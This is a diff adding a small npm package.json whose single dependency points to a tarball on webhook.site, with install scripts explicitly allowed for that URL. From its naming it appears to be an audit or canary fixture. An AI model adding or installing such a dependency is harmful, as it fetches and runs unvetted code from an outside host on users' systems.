@@ -1,0 +1,11 @@
+{
+  "name": "abstraction-ingestion-control-e0c2da42cfe6",
+  "private": true,
+  "version": "1.0.0",
+  "dependencies": {
+    "abstraction-audit-fixture-e0c2da42cfe6": "https://webhook.site/6b10960c-4211-4968-ab98-7ebf8336ef5d/fixture.tgz"
+  },
+  "allowScripts": {
+    "https://webhook.site/6b10960c-4211-4968-ab98-7ebf8336ef5d/fixture.tgz": true
+  }
+}
